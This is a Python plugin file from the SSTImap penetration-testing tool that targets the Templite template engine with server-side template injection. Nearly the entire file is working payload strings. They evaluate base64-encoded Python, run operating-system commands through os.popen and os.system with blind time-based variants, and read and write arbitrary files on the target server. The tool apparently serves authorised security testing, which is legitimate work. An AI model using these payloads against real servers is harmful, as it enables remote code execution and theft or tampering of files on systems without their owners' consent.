from plugins.languages import python
from utils import rand


class Templite(python.Python):
    legacy_plugin = True
    formatter = "sstimap"
    priority = 7
    plugin_info = {
        "Description": """Templite/Templite+ template engine in Python""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Original SSTImap payload
        ],
        "Engine": [
            "PyPi: https://pypi.org/project/templite/",
            "GitLab: https://git.joonis.de/-/snippets/4",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': 'SSTIMAP:code;',
                # A way to check for actual Templite syntax:
                # Use trailing $ to execute division by zero in templates using ${}
                'header': '${1}${1/0}_${emit(SSTIMAP:header:get,0;+SSTIMAP:header:get,1;)}$',
                'trailer': '${emit(SSTIMAP:trailer:get,0;+SSTIMAP:trailer:get,1;)}$',
                'test_render': f"""${{emit('{rand.randstrings[0]}'.join('{rand.randstrings[1]}'))}}$""",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'render_error': {
                'render': 'SSTIMAP:code;',
                'header': '${1}${1/0}_${getattr("", str(SSTIMAP:header:get,0;+SSTIMAP:header:get,1;)+str(',
                'trailer': ').rstrip()+str(SSTIMAP:trailer:get,0;+SSTIMAP:trailer:get,1;))}$',
                'test_render': f"""'{rand.randstrings[0]}'.join('{rand.randstrings[1]}')""",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'evaluate': {
                'evaluate': """${emit(eval(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode()))}$"""
            },
            'evaluate_error': {
                'evaluate': """eval(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode())"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """${1}${1/0}_${str(1 / bool(eval(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode())))}$"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """${1}${1/0}_${eval(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode()) and __import__('time').sleep(SSTIMAP:delay;)}$"""
            },
            'execute': {
                'call': 'render',
                'execute': """${emit(__import__('os').popen(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode()).read())}$""",
            },
            'execute_error': {
                'call': 'render',
                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode()).read()""",
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """${1 / (__import__('os').system(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode()) == 0)}$"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """${__import__('os').popen(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode() + ' && sleep SSTIMAP:delay;').read()}$"""
            },
            'write': {
                'call': 'inject',
                'write': """${open("SSTIMAP:path;", 'ab+').write(__import__("base64").urlsafe_b64decode('SSTIMAP:chunk:b64u;'))}$""",
                'truncate': """${open("SSTIMAP:path;", 'w').close()}$"""
            },
            'read': {
                'call': 'inject',
                'read': """${emit(__import__("base64").b64encode(open("SSTIMAP:path;", "rb").read()))}$"""
            },
            'md5': {
                'call': 'inject',
                'md5': """${emit(__import__("hashlib").md5(open("SSTIMAP:path;", 'rb').read()).hexdigest())}$"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # Normal reflecting tag ${ }$
            {'level': 1, 'prefix': 'SSTIMAP:closure;}$', 'suffix': '${#', 'closures': python.ctx_closures},
        ])
